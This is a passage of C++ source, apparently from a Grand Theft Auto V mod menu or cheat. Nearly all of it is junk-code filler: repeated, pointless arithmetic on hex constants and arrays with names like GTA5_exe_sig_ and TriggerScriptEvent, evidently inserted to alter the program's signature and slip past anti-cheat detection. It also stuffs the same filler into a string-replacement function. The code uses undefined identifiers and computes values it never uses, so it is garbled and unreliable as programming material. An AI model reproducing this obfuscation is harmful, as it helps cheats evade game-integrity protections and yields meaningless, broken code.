			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			std::string base = palavra;
			std::string str = base;
			str.replace(str.begin(), str.end(), letraantiga, letranova);
			return str;
		}
		std::string ReplaceWord(std::string str, const std::string& from, const std::string& to) {
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
